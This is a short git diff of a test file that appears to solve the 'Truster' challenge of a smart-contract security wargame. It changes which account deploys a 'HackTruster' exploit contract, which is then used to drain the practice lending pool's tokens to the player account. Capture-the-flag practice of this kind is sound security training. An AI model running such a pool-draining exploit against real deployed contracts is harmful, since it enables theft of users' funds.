@@ -23,7 +23,10 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        hackContract = await (await ethers.getContractFactory('HackTruster', deployer)).deploy(pool.address, token.address);
+        hackContract = await (await ethers.getContractFactory('HackTruster', player)).deploy(
+            pool.address,
+            token.address
+        );
         await hackContract.connect(player).hack(TOKENS_IN_POOL)
         await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL)
     });
